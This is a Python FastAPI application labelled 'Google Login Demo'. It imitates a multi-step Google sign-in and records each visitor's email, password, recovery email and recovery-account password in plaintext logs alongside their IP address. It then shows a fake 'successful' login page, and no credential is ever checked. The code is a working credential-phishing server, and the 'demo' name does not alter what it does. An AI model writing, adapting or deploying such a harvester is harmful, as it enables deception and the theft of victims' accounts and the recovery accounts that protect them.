from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
import logging
from datetime import datetime
import uvicorn

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="Google Login Demo")
templates = Jinja2Templates(directory="templates")

# Шаг 1: Ввод email
@app.get("/", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("email_step.html", {"request": request})

# Обработка email и переход к паролю
@app.post("/verify-email")
async def verify_email(request: Request, email: str = Form(...)):
    client_host = request.client.host if request.client else "N/A"
    logger.info(f"[1-EMAIL] IP: {client_host}, Email: '{email}'")
    response = RedirectResponse(url="/password", status_code=303)
    response.set_cookie(key="user_email", value=email)
    return response

# Шаг 2: Ввод пароля
@app.get("/password", response_class=HTMLResponse)
async def password_page(request: Request):
    email = request.cookies.get("user_email", "usuario@ejemplo.com")
    return templates.TemplateResponse("password_step.html", {"request": request, "email": email})

# Обработка пароля и переход к recovery email
@app.post("/verify-password")
async def verify_password(request: Request, password: str = Form(...)):
    client_host = request.client.host if request.client else "N/A"
    email = request.cookies.get("user_email", "Desconocido")
    logger.info(f"[2-PASSWORD] IP: {client_host}, For: '{email}', Password: '{password}'")
    return RedirectResponse(url="/recovery", status_code=303)

# Шаг 3: Ввод recovery email и его пароля
@app.get("/recovery", response_class=HTMLResponse)
async def recovery_page(request: Request):
    email = request.cookies.get("user_email", "usuario@ejemplo.com")
    return templates.TemplateResponse("recovery_step.html", {"request": request, "email": email})

# Финальная обработка и "успешный" вход
@app.post("/verify-recovery")
async def verify_recovery(request: Request, recovery_email: str = Form(...), recovery_password: str = Form(...)):
    client_host = request.client.host if request.client else "N/A"
    main_email = request.cookies.get("user_email", "Desconocido")
    log_message = f"[3-RECOVERY] IP: {client_host}, Main: '{main_email}', Recovery Email: '{recovery_email}', Recovery Password: '{recovery_password}'"
    logger.info(log_message)
    return templates.TemplateResponse("final.html", {"request": request, "email": main_email})

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)